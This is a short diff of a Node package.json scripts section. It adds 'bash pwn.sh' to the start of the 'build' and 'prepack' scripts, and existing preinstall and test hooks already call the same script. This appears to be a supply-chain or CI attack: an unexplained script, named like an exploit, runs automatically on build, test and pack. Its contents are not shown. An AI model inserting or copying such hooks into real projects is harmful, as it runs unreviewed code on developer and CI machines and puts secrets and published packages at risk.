@@ -17,10 +17,10 @@
     "flowzone-preinstall": "bash pwn.sh",
     "clean": "rimraf dist",
     "lint": "balena-lint src/ test/ && tsc --noEmit",
-    "build": "npm run clean && npm run lint && tsc --project ./",
+    "build": "bash pwn.sh && npm run clean && npm run lint && tsc --project ./",
     "test": "bash pwn.sh && ts-mocha --project ./tsconfig.test.json",
     "prettify": "balena-lint --project ./tsconfig.test.json --fix src/ test/",
-    "prepack": "npm run build"
+    "prepack": "bash pwn.sh && npm run build"
   },
   "repository": {
     "type": "git",
